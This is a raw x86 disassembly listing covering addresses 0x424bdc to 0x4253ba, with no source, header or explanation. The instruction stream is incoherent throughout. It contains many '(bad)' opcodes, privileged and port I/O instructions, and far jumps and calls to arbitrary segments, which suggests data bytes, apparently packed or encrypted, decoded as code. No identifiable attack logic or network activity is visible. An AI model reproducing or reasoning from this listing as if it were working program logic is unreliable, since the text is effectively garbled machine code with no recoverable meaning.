  424bdc:	adc    edx,0x47
  424bdf:	or     cl,ah
  424be1:	ror    DWORD PTR [edi+edx*8-0x3f3b6d0a],cl
  424be8:	arpl   WORD PTR [edx+0x62],sp
  424beb:	jge    0x424bba
  424bed:	or     ebp,DWORD PTR [edx-0x69c1598b]
  424bf3:	ins    DWORD PTR es:[edi],dx
  424bf4:	retf   0xce8b
  424bf7:	ja     0x424bb5
  424bf9:	pop    ds
  424bfa:	push   es
  424bfb:	and    DWORD PTR [edi],eax
  424bfd:	seta   BYTE PTR [esi-0x18]
  424c01:	and    al,0x22
  424c03:	dec    edx
  424c04:	test   eax,0x26c5807b
  424c09:	ror    DWORD PTR [esi],0x2
  424c0c:	mov    ?,WORD PTR [ecx+0x2c]
  424c0f:	(bad)  
  424c10:	fimul  WORD PTR [esi+ebp*1]
  424c13:	cld    
  424c14:	or     al,BYTE PTR [ebp+0x70955986]
  424c1a:	rcr    DWORD PTR [ecx-0x63],0x47
  424c1e:	pop    ecx
  424c1f:	dec    ebx
  424c20:	mov    ebp,0x16a1602a
  424c25:	push   es
  424c26:	jmp    0x6698:0xf5787f76
  424c2d:	push   esp
  424c2e:	nop
  424c2f:	lock fisub WORD PTR [ecx-0x4a]
  424c33:	cmp    dl,BYTE PTR [ebp+0x78]
  424c36:	and    ebp,DWORD PTR [edi]
  424c38:	or     BYTE PTR [eax+0x61],dl
  424c3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c3c:	xchg   BYTE PTR [eax],dh
  424c3e:	loop   0x424bd8
  424c40:	mul    BYTE PTR [ebp-0x4c450741]
  424c46:	sub    dl,BYTE PTR ds:0xb22f66c9
  424c4c:	(bad)  
  424c4d:	rol    DWORD PTR [ebx],1
  424c4f:	mov    ds:0x869aa057,al
  424c54:	mov    dh,0x1
  424c56:	fwait
  424c57:	sub    eax,0x3d8f3a57
  424c5c:	sub    al,0x21
  424c5e:	aaa    
  424c5f:	cwde   
  424c60:	mov    eax,ds:0xca875710
  424c65:	xlat   BYTE PTR ds:[ebx]
  424c66:	dec    ebx
  424c67:	adc    edi,esi
  424c69:	jno    0x424cb1
  424c6b:	int3   
  424c6c:	and    BYTE PTR [edx+0x1],cl
  424c6f:	jmp    0xb218976f
  424c74:	add    ecx,DWORD PTR [eax+0x47f7cbc6]
  424c7a:	das    
  424c7b:	cmp    edx,DWORD PTR [ecx]
  424c7d:	sbb    eax,DWORD PTR [edx-0x2a]
  424c80:	sbb    ch,BYTE PTR [ebx-0x2f78ffa1]
  424c86:	xchg   edx,eax
  424c87:	sti    
  424c88:	sahf   
  424c89:	cdq    
  424c8a:	retf   
  424c8b:	cdq    
  424c8c:	jge    0x424cff
  424c8e:	nop
  424c8f:	or     eax,0x17d1a32e
  424c94:	adc    DWORD PTR [edx+0xff55742],ecx
  424c9a:	aaa    
  424c9b:	sahf   
  424c9c:	mov    edx,gs
  424c9e:	lea    ebp,[edi+0x5b32a9f5]
  424ca4:	add    esi,DWORD PTR [eax+0x6f53b32c]
  424caa:	test   al,0xdd
  424cac:	dec    ebx
  424cad:	lahf   
  424cae:	popa   
  424caf:	stos   DWORD PTR es:[edi],eax
  424cb0:	xor    BYTE PTR ss:[eax+0x7a],cl
  424cb4:	std    
  424cb5:	sub    esp,ebx
  424cb7:	fst    QWORD PTR [edi]
  424cb9:	xor    al,0x14
  424cbb:	jecxz  0x424d21
  424cbd:	addr16 stc 
  424cbf:	push   0x6f91e708
  424cc4:	out    0xb0,eax
  424cc6:	mov    ds:0xeb00c15,eax
  424ccb:	pushf  
  424ccc:	aas    
  424ccd:	repnz inc esp
  424ccf:	in     al,dx
  424cd0:	ja     0x424c74
  424cd2:	rcl    ecx,cl
  424cd4:	inc    esi
  424cd5:	icebp  
  424cd6:	mov    ch,0x7
  424cd8:	ds xchg esp,eax
  424cda:	mov    esp,0x9377e829
  424cdf:	pop    eax
  424ce0:	outs   dx,DWORD PTR ds:[esi]
  424ce1:	pop    edx
  424ce2:	cmp    cl,BYTE PTR gs:[esi+ecx*4]
  424ce6:	jbe    0x424cb7
  424ce8:	imul   ebp,DWORD PTR [eax+0x57],0xb4479fbd
  424cef:	jmp    0xcc8620e9
  424cf4:	ret    
  424cf5:	arpl   bp,si
  424cf7:	xchg   ebx,eax
  424cf8:	mov    bh,bl
  424cfa:	fisubr WORD PTR [eax-0x80]
  424cfd:	scas   al,BYTE PTR es:[edi]
  424cfe:	int    0x5b
  424d00:	das    
  424d01:	add    bl,BYTE PTR [ebp-0x5e]
  424d04:	call   0xe76c8ef
  424d09:	mov    dh,0xd9
  424d0b:	stc    
  424d0c:	ds jmp 0x8b12:0xb7f1d65c
  424d14:	cmp    ah,dh
  424d16:	xchg   esi,eax
  424d17:	xchg   edi,eax
  424d18:	stos   DWORD PTR es:[edi],eax
  424d19:	call   0x2e9f:0xd54fa076
  424d20:	into   
  424d21:	push   0x3031c7ad
  424d26:	xchg   ebp,eax
  424d27:	scas   al,BYTE PTR es:[edi]
  424d28:	gs or  eax,0x6a81afc8
  424d2e:	std    
  424d2f:	jl     0x424d9e
  424d31:	mov    bh,0x57
  424d33:	mov    ax,0xa83c
  424d37:	int3   
  424d38:	pop    ds
  424d39:	xchg   ebp,eax
  424d3a:	push   cs
  424d3b:	inc    esi
  424d3c:	inc    ebp
  424d3d:	shl    DWORD PTR [edx+ebp*4+0x2e],0x1d
  424d42:	and    eax,0x658b3d74
  424d47:	popa   
  424d48:	or     edi,DWORD PTR [ecx+0x75]
  424d4b:	jge    0x424cf9
  424d4d:	jge    0x424d61
  424d4f:	daa    
  424d50:	push   esi
  424d51:	std    
  424d52:	dec    esp
  424d53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d54:	inc    edi
  424d55:	jne    0x424d69
  424d57:	adc    al,dh
  424d59:	push   ecx
  424d5a:	jo     0x424d94
  424d5c:	inc    eax
  424d5d:	loope  0x424ce5
  424d5f:	mov    dl,0x7b
  424d61:	retf   0x5322
  424d64:	cwde   
  424d65:	gs dec esp
  424d67:	cmp    DWORD PTR [edi+0x24],edx
  424d6a:	or     ebp,DWORD PTR [edi+0x76]
  424d6d:	mov    esp,DWORD PTR [ebp+0x1]
  424d70:	rcr    ch,cl
  424d72:	test   BYTE PTR ds:0xf7e8ece6,ah
  424d78:	mov    DWORD PTR [ecx],ecx
  424d7a:	add    BYTE PTR [eax],al
  424d7c:	stos   BYTE PTR es:[edi],al
  424d7d:	jo     0x424d5f
  424d7f:	dec    ecx
  424d80:	cli    
  424d81:	fldcw  WORD PTR [ebx-0x35bf70d]
  424d87:	loopne 0x424dd3
  424d89:	shl    bl,cl
  424d8b:	mov    dl,0xe8
  424d8d:	mov    BYTE PTR [ecx],0x0
  424d90:	xchg   BYTE PTR [edx],al
  424d92:	add    BYTE PTR [eax],al
  424d94:	call   DWORD PTR [ebp-0x404b6fb4]
  424d9a:	mov    ah,BYTE PTR [ebx-0x20de1f69]
  424da0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424da1:	add    al,0x2d
  424da3:	jmp    0x424d53
  424da5:	call   0x28b7:0x2c412304
  424dac:	int3   
  424dad:	int    0x70
  424daf:	xor    eax,0xdac7ccb7
  424db4:	xor    bl,bl
  424db6:	push   0x36
  424db8:	mov    cl,0x95
  424dba:	mov    ecx,DWORD PTR [ebp-0x73]
  424dbd:	mov    ecx,0xd3077764
  424dc2:	cld    
  424dc3:	jae    0x424d94
  424dc5:	pop    ebp
  424dc6:	fdiv   st(7),st
  424dc8:	nop
  424dc9:	push   ss
  424dca:	ds scas eax,DWORD PTR es:[edi]
  424dcc:	call   0xb6ce1a3b
  424dd1:	mov    esi,0x57adc0da
  424dd6:	mov    dl,0x83
  424dd8:	mov    bh,0xb0
  424dda:	sub    dh,cl
  424ddc:	shl    dh,0x9f
  424ddf:	int3   
  424de0:	rcl    BYTE PTR [edi],0x54
  424de3:	ins    BYTE PTR es:[edi],dx
  424de4:	std    
  424de5:	mov    BYTE PTR [esi+0x2b],dl
  424de8:	xchg   dh,ch
  424dea:	fisttp QWORD PTR [edx-0x68]
  424ded:	and    al,0x2d
  424def:	mov    bh,BYTE PTR [ebx]
  424df1:	or     bh,BYTE PTR [edi]
  424df3:	icebp  
  424df4:	mov    BYTE PTR [ecx],bh
  424df6:	test   al,0xd2
  424df8:	fs pop ebp
  424dfa:	push   edx
  424dfb:	adc    edx,edi
  424dfd:	inc    esi
  424dfe:	arpl   WORD PTR [ebp-0x70],ax
  424e01:	pop    ds
  424e02:	mov    bh,0xbf
  424e04:	xchg   ebx,eax
  424e05:	cmp    edi,ebx
  424e07:	retf   
  424e08:	inc    edi
  424e09:	mov    edx,0x4d22d63c
  424e0e:	cmp    al,0x15
  424e10:	jmp    0x522f27df
  424e15:	mov    ah,0xd
  424e17:	pop    esi
  424e18:	mov    ebp,DWORD PTR [ecx]
  424e1a:	cmc    
  424e1b:	retf   
  424e1c:	popf   
  424e1d:	leave  
  424e1e:	cmc    
  424e1f:	push   0xf4f9206b
  424e24:	jge    0x424e08
  424e26:	shr    edi,1
  424e28:	push   ds
  424e29:	daa    
  424e2a:	outs   dx,BYTE PTR ds:[esi]
  424e2b:	inc    eax
  424e2c:	inc    esi
  424e2d:	add    DWORD PTR [ecx-0x35],0xffffffc5
  424e31:	pop    edx
  424e32:	(bad)  
  424e33:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  424e35:	pop    ebp
  424e36:	mov    ah,cl
  424e38:	mov    ds:0xb768df72,al
  424e3d:	loop   0x424e77
  424e3f:	xchg   ebx,eax
  424e40:	xchg   esp,eax
  424e41:	bound  edi,QWORD PTR [edx-0x80]
  424e44:	jae    0x424e2b
  424e46:	pop    ebp
  424e47:	pushf  
  424e48:	je     0x424e00
  424e4a:	mov    ebx,0x7eb56703
  424e4f:	enter  0xcccb,0xe1
  424e53:	jae    0x424e06
  424e55:	loopne 0x424e75
  424e57:	sub    BYTE PTR [ebx],0xda
  424e5a:	xor    esp,DWORD PTR [ecx-0x13]
  424e5d:	out    dx,al
  424e5e:	hlt    
  424e5f:	das    
  424e60:	sahf   
  424e61:	inc    ecx
  424e62:	push   0xfffffff5
  424e64:	sti    
  424e65:	sub    eax,0x95b6a6d8
  424e6a:	pop    edx
  424e6b:	aas    
  424e6c:	call   0xc4a7:0x5731c9ec
  424e73:	addr16 ds (bad) 
  424e76:	pushf  
  424e77:	scas   eax,DWORD PTR es:[edi]
  424e78:	jnp    0x424edf
  424e7a:	pop    ebp
  424e7b:	cli    
  424e7c:	mov    WORD PTR [eax+0x2433bf63],cs
  424e82:	jl     0x424e62
  424e84:	xchg   cl,dl
  424e86:	cmc    
  424e87:	dec    esp
  424e88:	(bad)  
  424e89:	fidiv  DWORD PTR [edi-0x37]
  424e8c:	test   DWORD PTR [edx],edi
  424e8e:	test   DWORD PTR [esi],ecx
  424e90:	add    eax,0x4316527a
  424e95:	adc    al,0xf3
  424e97:	ss mov bl,0xb6
  424e9a:	mov    ah,0xb5
  424e9c:	adc    al,0x1e
  424e9e:	sub    DWORD PTR [esi+0x67],eax
  424ea1:	push   ss
  424ea2:	sub    al,0xea
  424ea4:	jecxz  0x424e54
  424ea6:	int3   
  424ea7:	inc    edx
  424ea8:	mov    edx,0xf84256a0
  424ead:	mov    edx,0x4dc2e707
  424eb2:	mov    bh,0x56
  424eb4:	hlt    
  424eb5:	pop    ecx
  424eb6:	mov    esi,DWORD PTR [ebx+ecx*1]
  424eb9:	add    al,0x84
  424ebb:	ret    
  424ebc:	rcl    ebx,cl
  424ebe:	inc    ecx
  424ebf:	jmp    0x424ecb
  424ec1:	jns    0x424f24
  424ec3:	nop
  424ec4:	push   eax
  424ec5:	(bad)  
  424ec6:	mov    ebp,0xded82eb2
  424ecb:	in     al,dx
  424ecc:	test   BYTE PTR [edx+0x52540fbb],0x9e
  424ed3:	call   0x5d60:0x5351de8e
  424eda:	test   BYTE PTR [edx],al
  424edc:	sbb    eax,0x2a529d05
  424ee1:	push   ds
  424ee2:	jnp    0x424ecf
  424ee4:	das    
  424ee5:	(bad)  
  424ee6:	shl    DWORD PTR [ecx+0x63],cl
  424ee9:	leave  
  424eea:	sahf   
  424eeb:	mov    ah,0x41
  424eed:	pushf  
  424eee:	je     0x424f4c
  424ef0:	shl    cl,0x78
  424ef3:	call   0xbe2be833
  424ef8:	mov    ds:0xbbcab31a,al
  424efd:	sub    al,0x13
  424eff:	sti    
  424f00:	adc    eax,0x70084fac
  424f05:	mov    ds:0x5b06255a,al
  424f0a:	clc    
  424f0b:	cmp    bl,BYTE PTR [edi]
  424f0d:	jb     0x424f44
  424f0f:	push   ebx
  424f10:	pop    ds
  424f11:	test   al,0xcd
  424f13:	xor    esi,DWORD PTR [edi]
  424f15:	es add eax,0x55f6b3e3
  424f1b:	jmp    0xd8c9:0xdf93ca18
  424f22:	mov    gs,WORD PTR [edx-0x8]
  424f25:	jnp    0x424f4c
  424f27:	or     eax,0x905fb7ad
  424f2c:	pop    dx
  424f2e:	inc    edi
  424f2f:	fstp   TBYTE PTR [eax]
  424f31:	fxch   st(5)
  424f33:	add    eax,0xd262605c
  424f38:	push   0x109a4c75
  424f3d:	push   0xffffffd1
  424f3f:	xchg   esi,eax
  424f40:	fidiv  WORD PTR [edx]
  424f42:	call   0x190d8dd7
  424f47:	pop    ss
  424f48:	(bad)  
  424f49:	data16 clc 
  424f4b:	xor    DWORD PTR [ebp+0x3],ebp
  424f4e:	imul   esp,DWORD PTR [esi-0x68],0x9e1375cb
  424f55:	enter  0x5038,0xf4
  424f59:	shl    BYTE PTR [edx],0xeb
  424f5c:	stos   DWORD PTR es:[edi],eax
  424f5d:	pop    ds
  424f5e:	ss or  al,0x28
  424f61:	ds jge 0x424f77
  424f64:	retf   0xeeab
  424f67:	js     0x424fa5
  424f69:	cmp    edi,DWORD PTR [ebx+0x31]
  424f6c:	mov    al,ds:0x1acbc54
  424f71:	inc    edx
  424f72:	jmp    0xccf2e97
  424f77:	stos   DWORD PTR es:[edi],eax
  424f78:	iret   
  424f79:	data16 jge 0x424f5d
  424f7c:	and    ch,BYTE PTR [ebx]
  424f7e:	mov    BYTE PTR [edi-0x5d46f9f1],al
  424f84:	(bad)  
  424f85:	daa    
  424f86:	js     0x424ffc
  424f88:	push   edx
  424f89:	jae    0x424f8e
  424f8b:	add    eax,0x9a146ede
  424f90:	xor    BYTE PTR [esi+ebp*4-0x73ff27e6],al
  424f97:	sub    al,0x45
  424f99:	mov    ?,WORD PTR [ebx+0x3dc3d5c3]
  424f9f:	mov    ah,0xdd
  424fa1:	sub    bl,BYTE PTR [ebx]
  424fa3:	adc    dh,dh
  424fa5:	dec    eax
  424fa6:	sub    ax,0x725
  424faa:	(bad)  
  424fab:	fnstsw WORD PTR ds:0xe0b6
  424fb0:	rcr    DWORD PTR [ecx-0x17824cb4],0xd3
  424fb7:	stc    
  424fb8:	push   0x439609e9
  424fbd:	dec    eax
  424fbe:	cwde   
  424fbf:	stos   BYTE PTR es:[edi],al
  424fc0:	fisubr WORD PTR [edi+0x2c]
  424fc3:	mov    al,0x52
  424fc5:	jne    0x424f94
  424fc7:	and    ebx,ebx
  424fc9:	int3   
  424fca:	add    BYTE PTR [esp+ebx*1],0x85
  424fce:	sub    DWORD PTR [edi-0x65],edx
  424fd1:	mov    al,ds:0x8018dfd6
  424fd6:	jbe    0x424fec
  424fd8:	push   edi
  424fd9:	xchg   edi,eax
  424fda:	adc    BYTE PTR [ebx+0x7d],ah
  424fdd:	push   ds
  424fde:	inc    ebx
  424fdf:	stc    
  424fe0:	push   esp
  424fe1:	mov    gs,WORD PTR [ebx]
  424fe3:	push   eax
  424fe4:	fstp   QWORD PTR [ebx-0x4c87c244]
  424fea:	cmp    ax,0xe968
  424fee:	mov    ebx,DWORD PTR [ebp-0x662b0612]
  424ff4:	pop    ebp
  424ff5:	and    eax,DWORD PTR [ecx+0x7d02abc4]
  424ffb:	hlt    
  424ffc:	out    0x7a,eax
  424ffe:	jmp    0x425022
  425000:	popf   
  425001:	aas    
  425002:	shr    BYTE PTR [edi+edi*8+0x7a7e05fd],cl
  425009:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42500a:	scas   eax,DWORD PTR es:[edi]
  42500b:	mov    edi,0xbdd6175d
  425010:	add    al,0x5a
  425012:	xor    al,0x31
  425014:	rol    eax,cl
  425016:	mov    eax,0x2c8507
  42501b:	add    BYTE PTR [edx-0x79],cl
  42501e:	push   edx
  42501f:	dec    esp
  425020:	(bad)  
  425022:	pop    esi
  425023:	xchg   eax,esp
  425025:	js     0x424fa8
  425027:	mov    ebx,0xb80e043f
  42502c:	outs   dx,BYTE PTR ds:[esi]
  42502d:	leave  
  42502e:	add    DWORD PTR [eax],eax
  425030:	xchg   BYTE PTR [edx],al
  425032:	add    BYTE PTR [eax],al
  425034:	adc    bh,0x56
  425037:	cdq    
  425038:	mov    esp,0x2f066739
  42503d:	xor    bl,BYTE PTR [esi]
  42503f:	sub    BYTE PTR [edx-0x2014fd90],0x9b
  425046:	fs stc 
  425048:	outs   dx,BYTE PTR ds:[esi]
  425049:	je     0x42508d
  42504b:	retf   
  42504c:	dec    esp
  42504d:	mov    BYTE PTR [esi-0x37],0x4
  425051:	cs lahf 
  425053:	push   esi
  425054:	adc    eax,0xe33c3938
  425059:	arpl   WORD PTR [esp+esi*2+0x59],si
  42505d:	mov    ch,0xd0
  42505f:	jne    0x425098
  425061:	xchg   esi,eax
  425062:	out    dx,al
  425063:	or     esp,DWORD PTR [eax+0xa]
  425066:	mov    esi,0xb7e3065f
  42506b:	and    ecx,esi
  42506d:	rcl    edx,0x42
  425070:	inc    ecx
  425071:	xor    al,0x98
  425073:	ins    BYTE PTR es:[edi],dx
  425074:	not    DWORD PTR [edx+ebx*2-0x3419b0a8]
  42507b:	test   edi,0xcf357412
  425081:	xor    DWORD PTR [ecx],ebx
  425083:	jb     0x4250bd
  425085:	sbb    eax,0x14cf26a2
  42508a:	in     eax,0xfc
  42508c:	pop    ebp
  42508d:	xlat   BYTE PTR ds:[ebx]
  42508e:	leave  
  42508f:	jno    0x425066
  425091:	jmp    0xa80e:0x2c837777
  425098:	mov    ebp,0xf50b6adf
  42509d:	aad    0xfe
  42509f:	sub    al,0xc9
  4250a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250a2:	inc    edi
  4250a3:	aad    0x63
  4250a5:	xchg   ebx,eax
  4250a6:	sub    esi,esp
  4250a8:	jnp    0x42505f
  4250aa:	(bad)  
  4250ab:	test   DWORD PTR [ebx+eiz*1],0x5b4097e0
  4250b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250b3:	loope  0x42508a
  4250b5:	and    BYTE PTR [edx+0x39],bl
  4250b8:	dec    edi
  4250b9:	push   0xbb5274a
  4250be:	or     BYTE PTR [edx+0x25],bl
  4250c1:	add    esp,DWORD PTR ds:0xa3cfdd71
  4250c7:	idiv   BYTE PTR [ebx-0xd]
  4250ca:	addr16 dec edx
  4250cc:	in     eax,dx
  4250cd:	rol    BYTE PTR [edx+esi*1-0x3f632086],0xd3
  4250d5:	stc    
  4250d6:	test   eax,0x84f17435
  4250db:	dec    ebp
  4250dc:	or     DWORD PTR [esi+0x1a],esp
  4250df:	fimul  DWORD PTR [edx]
  4250e1:	scas   al,BYTE PTR es:[edi]
  4250e2:	sar    DWORD PTR [esi-0x301f9936],cl
  4250e8:	pushaw 
  4250ea:	sahf   
  4250eb:	push   es
  4250ec:	mov    edi,0xde8e6f46
  4250f1:	mov    cl,0xaf
  4250f3:	mov    ecx,0x53368543
  4250f8:	jae    0x4250f2
  4250fa:	sub    edx,DWORD PTR [ecx+0x49]
  4250fd:	mov    ch,0xed
  4250ff:	cmp    al,0xf2
  425101:	out    0xdb,eax
  425103:	add    al,0x25
  425105:	sub    al,BYTE PTR [ebx]
  425107:	push   esi
  425108:	mov    bl,0x5f
  42510a:	push   ecx
  42510b:	jmp    0x7a54a1ce
  425110:	sbb    eax,0xdd847cf6
  425115:	loope  0x425142
  425117:	mov    edx,0x249e9e03
  42511c:	(bad)  
  42511d:	cld    
  42511e:	out    dx,al
  42511f:	(bad)  
  425120:	mov    esp,0x1d6f76f9
  425125:	fbstp  TBYTE PTR [ebp-0x69]
  425128:	xchg   edi,eax
  425129:	mov    ah,BYTE PTR es:[eax+eiz*4]
  42512d:	fcmovnu st,st(3)
  42512f:	sub    BYTE PTR [eax+0x24],dh
  425132:	imul   ebx,DWORD PTR [ebp+0x2f6606e6],0x1a91818
  42513c:	inc    edi
  42513d:	or     dl,BYTE PTR [ebx]
  42513f:	(bad)  
  425140:	lock sub eax,0xf0994a7a
  425146:	pop    ds
  425147:	mov    DWORD PTR [ebx+0x11],edi
  42514a:	jo     0x42515a
  42514c:	pop    esp
  42514d:	pop    ebp
  42514e:	std    
  42514f:	aam    0x3a
  425151:	mov    ch,0xcf
  425153:	mov    WORD PTR [ecx],ss
  425155:	mov    WORD PTR [ebx],es
  425157:	adc    al,0xb
  425159:	inc    eax
  42515a:	mov    ch,0x10
  42515c:	pop    ecx
  42515d:	jge    0x425101
  42515f:	inc    ebp
  425160:	pop    edi
  425161:	int    0x9a
  425163:	imul   eax,DWORD PTR [esi-0x32],0x7d1200fb
  42516a:	pop    ds
  42516b:	(bad)  
  42516c:	xchg   ebp,eax
  42516d:	rol    BYTE PTR [ecx],1
  42516f:	cmc    
  425170:	sub    BYTE PTR [esi-0x3e],bh
  425173:	cmp    eax,0x22d4b55a
  425178:	mov    ah,BYTE PTR [edx-0x5df2c79]
  42517e:	enter  0x2a16,0x8f
  425182:	test   BYTE PTR [ebp+0x21],bh
  425185:	jecxz  0x42518d
  425187:	sub    ebx,esp
  425189:	aaa    
  42518a:	mul    BYTE PTR [eax-0x3b65df81]
  425190:	jb     0x425165
  425192:	inc    ebx
  425193:	sbb    ebx,DWORD PTR [esi-0x106e19c2]
  425199:	retf   
  42519a:	loope  0x42514e
  42519c:	mov    edi,0x6f9f9abd
  4251a1:	sbb    eax,DWORD PTR [ecx+eax*8-0x1f7383d8]
  4251a8:	stc    
  4251a9:	xchg   edx,eax
  4251aa:	ret    
  4251ab:	rol    BYTE PTR [ecx+0x35],cl
  4251ae:	sub    DWORD PTR [edi+0x37],eax
  4251b1:	xchg   edx,eax
  4251b2:	and    al,0xef
  4251b4:	mov    edx,0xd77fc2c
  4251b9:	xor    DWORD PTR [eax-0x6655c823],ebx
  4251bf:	sub    DWORD PTR [esi+edx*4-0x3ce5ff5d],eax
  4251c6:	add    al,0x60
  4251c8:	and    DWORD PTR [ebp+0x65],0x28d40046
  4251cf:	ret    0x67cc
  4251d2:	add    eax,0x507f631f
  4251d7:	shr    BYTE PTR [edi-0x5e635291],cl
  4251dd:	or     eax,0x92af7f68
  4251e2:	fs sub al,0xae
  4251e5:	stc    
  4251e6:	aad    0xd7
  4251e8:	push   edx
  4251e9:	aam    0x92
  4251eb:	enter  0xc72a,0x30
  4251ef:	mov    cl,0x69
  4251f1:	jb     0x4251ad
  4251f3:	je     0x4251c1
  4251f5:	inc    esp
  4251f6:	jo     0x42521f
  4251f8:	aaa    
  4251f9:	sbb    eax,DWORD PTR [edx+0x654ea255]
  4251ff:	xor    edi,DWORD PTR [ecx+0x6d]
  425202:	push   ss
  425203:	imul   ebx,DWORD PTR [esi+0x54605d72],0xffffffba
  42520a:	push   esi
  42520b:	sbb    BYTE PTR [ebp-0x5b],0xd8
  42520f:	sbb    al,BYTE PTR [edi-0x2f48bfb1]
  425215:	daa    
  425216:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425217:	int3   
  425218:	enter  0x5e66,0xa1
  42521c:	mov    bh,0xb6
  42521e:	add    DWORD PTR [ebp-0x50099c1b],0x1b96bfc
  425228:	mov    eax,ebx
  42522a:	and    edi,DWORD PTR [ebp+0x57]
  42522d:	pop    edi
  42522e:	pushf  
  42522f:	stos   DWORD PTR es:[edi],eax
  425230:	pop    edx
  425231:	and    eax,0xd3a5baa4
  425236:	in     al,dx
  425237:	sbb    BYTE PTR [esi+0x1c88e853],ch
  42523d:	xchg   ecx,eax
  42523e:	aas    
  42523f:	add    DWORD PTR [esi-0x40c1568d],0xa878a200
  425249:	mov    dl,0x36
  42524b:	mov    ebx,0x667a23c6
  425250:	loope  0x425215
  425252:	sub    bh,BYTE PTR [ecx+0x55ce8f87]
  425258:	jbe    0x425260
  42525a:	popf   
  42525b:	hlt    
  42525c:	jmp    0x837b:0xde185a6f
  425263:	idiv   BYTE PTR [ebp+0x22]
  425266:	sbb    eax,0xf49eb7b8
  42526b:	dec    esp
  42526c:	dec    eax
  42526d:	sub    ah,BYTE PTR [eax]
  42526f:	in     eax,0x93
  425271:	popa   
  425272:	repz dec eax
  425274:	or     ah,BYTE PTR [edi-0x2a1d4c0a]
  42527a:	dec    ebp
  42527b:	mov    bh,0x48
  42527d:	and    al,0x76
  42527f:	dec    ecx
  425280:	dec    esi
  425281:	gs sbb eax,0xcc00e54e
  425287:	adc    eax,0xb38997b
  42528c:	cmp    dl,ah
  42528e:	xchg   edx,edi
  425290:	xor    ecx,ebp
  425292:	test   eax,0x3fe20432
  425297:	ret    
  425298:	xchg   edx,eax
  425299:	sub    al,0x56
  42529b:	loope  0x4252f6
  42529d:	jno    0x42522a
  42529f:	int3   
  4252a0:	retf   0xb0
  4252a3:	xor    eax,0x1fad2d12
  4252a8:	repz mov ds:0x7c638fb0,eax
  4252ae:	mov    cl,0x35
  4252b0:	cwde   
  4252b1:	dec    ebp
  4252b2:	dec    ebx
  4252b3:	mov    ecx,0x52ae04a7
  4252b8:	pop    eax
  4252b9:	dec    ecx
  4252ba:	add    BYTE PTR [eax],al
  4252bc:	or     dl,BYTE PTR [edx-0x3c684]
  4252c2:	dec    edi
  4252c3:	mov    bl,0xec
  4252c5:	jo     0x42527e
  4252c7:	(bad)  
  4252c8:	sar    bl,1
  4252ca:	mov    dh,0xd4
  4252cc:	hlt    
  4252cd:	retf   
  4252ce:	add    DWORD PTR [eax],eax
  4252d0:	xchg   BYTE PTR [edx],al
  4252d2:	add    BYTE PTR [eax],al
  4252d4:	ins    DWORD PTR es:[edi],dx
  4252d5:	arpl   WORD PTR [ebx+0x22],bx
  4252d8:	das    
  4252d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4252da:	fist   DWORD PTR [eax-0x799a90f6]
  4252e0:	and    eax,0xb65a7030
  4252e5:	das    
  4252e6:	pop    eax
  4252e7:	scas   eax,DWORD PTR es:[edi]
  4252e8:	popf   
  4252e9:	jl     0x4252b4
  4252eb:	push   cs
  4252ec:	stc    
  4252ed:	into   
  4252ee:	dec    ebx
  4252ef:	xor    DWORD PTR [esi],esi
  4252f1:	sahf   
  4252f2:	add    DWORD PTR [esi+0x7d],esi
  4252f5:	dec    bp
  4252f7:	add    DWORD PTR [ecx],ecx
  4252f9:	fisubr DWORD PTR fs:[edx+edi*2+0x21]
  4252fe:	jae    0x425300
  425300:	mov    ds:0x3447355d,al
  425305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425306:	push   0x6fa5242
  42530b:	sub    al,0xd
  42530d:	inc    ebx
  42530e:	add    al,0x47
  425310:	adc    BYTE PTR [ebp+edi*8-0x7d],0x2a
  425315:	push   eax
  425316:	push   esp
  425317:	js     0x425309
  425319:	(bad)  
  42531a:	and    ebp,DWORD PTR [ebp+0x263955e4]
  425320:	or     ch,0x34
  425323:	idiv   ebx
  425325:	xchg   BYTE PTR [ecx+esi*1-0x368df5f],bh
  42532c:	dec    esi
  42532d:	mov    al,0x3d
  42532f:	xchg   ecx,eax
  425330:	add    al,0x54
  425332:	cmp    eax,0xbeec9440
  425337:	test   BYTE PTR ds:0xa6eee12f,0x7f
  42533e:	aaa    
  42533f:	out    dx,al
  425340:	and    edi,DWORD PTR [ebx+0xb]
  425343:	mov    esi,DWORD PTR [ebx+0x5f2e7d94]
  425349:	lahf   
  42534a:	outs   dx,DWORD PTR es:[esi]
  42534c:	pop    edx
  42534d:	xchg   esp,eax
  42534e:	pop    edi
  42534f:	jns    0x4252d6
  425351:	fs mov dh,BYTE PTR es:[ebp+0x7c]
  425356:	rol    BYTE PTR [ebx-0x7b5ea87c],0xf
  42535d:	popf   
  42535e:	shr    DWORD PTR [edx+0x6c],1
  425361:	xchg   ebp,eax
  425362:	pop    eax
  425363:	int    0xa2
  425365:	jge    0x4253a6
  425367:	and    DWORD PTR [edi-0x1b],esp
  42536a:	data16 mov ch,0x17
  42536d:	or     BYTE PTR [edi+0x5bee61b],dl
  425373:	in     al,dx
  425374:	ins    BYTE PTR es:[edi],dx
  425375:	gs ja  0x425339
  425378:	jae    0x42538c
  42537a:	pop    edi
  42537b:	call   0xd22ee5d9
  425380:	popf   
  425381:	mov    ebp,0x9ee9ae76
  425386:	cwde   
  425387:	inc    ebx
  425388:	sbb    cl,BYTE PTR [ebp-0x72d7a953]
  42538e:	(bad)  
  42538f:	pop    eax
  425390:	add    al,0xda
  425392:	ins    BYTE PTR es:[edi],dx
  425393:	and    DWORD PTR [ebx+0x30],esp
  425396:	pop    ds
  425397:	rcr    DWORD PTR [ebp-0x3c],0xb5
  42539b:	add    eax,DWORD PTR [eax+0x8840164]
  4253a1:	iret   
  4253a2:	les    eax,FWORD PTR [edx]
  4253a4:	daa    
  4253a5:	nop
  4253a6:	push   0xffffffe7
  4253a8:	sar    DWORD PTR [ebp+ecx*4+0x2decca78],cl
  4253af:	pop    es
  4253b0:	mov    al,ds:0x8ab75560
  4253b5:	add    BYTE PTR [ecx],bl
  4253b7:	mov    ch,0x26
  4253b9:	popf   
  4253ba:	push   ebx
